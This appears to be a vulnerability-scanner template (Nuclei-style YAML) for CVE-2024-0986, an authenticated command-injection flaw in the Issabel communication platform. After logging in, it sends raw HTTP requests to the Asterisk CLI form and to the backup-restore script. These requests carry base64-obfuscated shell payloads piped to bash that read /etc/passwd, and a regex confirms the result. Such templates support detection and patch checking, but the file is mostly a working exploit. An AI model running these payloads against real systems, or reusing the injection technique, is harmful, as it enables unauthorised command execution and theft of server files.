id: CVE-2024-0986

info:
  name: Issabel Authenticated Remote Code Execution (RCE)
  author: eunji
  severity: high
  description: |
    Issabel, an open-source communication platform based on Asterisk, contains a vulnerability (CVE-2024-0986)
    that allows an authenticated attacker to execute arbitrary system commands on the underlying server.
    This vulnerability arises from improper sanitization of user-supplied input in the Asterisk CLI interface
    and backup restore functionalities, enabling remote code execution via crafted HTTP requests.
  impact: |
    A successful exploitation of this vulnerability allows an authenticated attacker to:
    - Execute arbitrary system commands with server privileges.
    - Access sensitive files, such as `/etc/passwd`.
    - Compromise the integrity and confidentiality of the server.
  references:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-0986
    - https://github.com/issabel-org/issabel/issues
  tags: Issabel, Authenticated RCE, Asterisk, Backup, CLI, Exploit

variables:
  username: "{{username}}"
  password: "{{password}}"

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Host}}:{{Port}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept-Encoding: gzip, deflate, br
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Connection: keep-alive
        Accept-Language: en-US,en;q=0.5
        Content-Type: application/x-www-form-urlencoded
        Cookie: issabelSession=koglv53li3kpgba8ebol01brt4

        input_user={{username}}&input_pass={{password}}&submit_login=

      - |
        POST /index.php?menu=asterisk_cli HTTP/1.1
        Host: {{Host}}:{{Port}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded

        txtCommand=xmldoc+dump+%2Fvar%2Fwww%2Fbackup%2Fx%7C%7Becho%2CY2F0IC4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q%3D%7D%7C%7Bbase64%2C-d%7D%7Cbash

      - |
        GET /modules/backup_restore/restore.php?filename=x%7C%7Becho,Y2F0IC4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q=%7D%7C%7Bbase64,-d%7D%7Cbash HTTP/1.1
        Host: {{Host}}:{{Port}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept-Encoding: gzip, deflate, br
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Connection: keep-alive
        Accept-Language: en-US,en;q=0.5
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
